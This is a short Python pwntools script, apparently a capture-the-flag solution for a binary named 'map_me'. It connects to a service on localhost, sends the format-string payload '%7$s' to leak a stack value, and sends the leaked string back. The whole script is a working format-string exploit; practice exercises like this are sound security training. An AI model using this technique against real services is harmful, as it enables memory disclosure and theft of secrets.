from pwn import *

# p = process("./map_me")
p = connect("localhost",7777)
p.recv()
p.sendline(b"%7$s")
leak = p.recv().decode()
leak = leak.split(' ')
print(leak[1])

p.sendline(leak[1].encode())
print(p.recv())